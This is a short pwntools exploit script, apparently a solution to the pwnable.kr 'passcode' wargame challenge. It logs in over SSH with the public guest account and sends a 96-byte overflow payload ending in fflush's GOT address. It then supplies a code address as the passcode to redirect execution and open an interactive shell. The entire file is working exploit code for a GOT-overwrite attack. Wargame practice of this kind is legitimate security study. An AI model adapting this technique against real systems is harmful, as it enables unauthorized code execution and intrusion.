from pwn import *
#context.log_level='debug'

s = ssh('passcode','pwnable.kr',port=2222,password='guest')
p = s.process('./passcode')

e = ELF('./passcode')
fflush_got = e.got['fflush']

system_addr = int(0x080485d7)

payload = b'A'*96
payload += p32(fflush_got)

p.sendlineafter('enter you name : ',payload)
#p.recvuntil('enter passcode1 : ')
p.sendline(str(system_addr))

p.interactive()
